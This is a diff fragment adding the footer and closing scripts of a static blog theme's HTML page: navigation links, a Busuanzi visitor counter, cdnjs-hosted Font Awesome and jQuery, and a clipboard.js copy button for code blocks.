+                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+                --><!--
+                --><li><a href="/search/">Search</a></li><!--
+                --><!--
+                --><li><a href="/categories/">categories</a></li><!--
+                --><!--
+                --><li><a href="/tags/">tags</a></li><!--
+                --><!--
+                --><li><a href="/links/">links</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
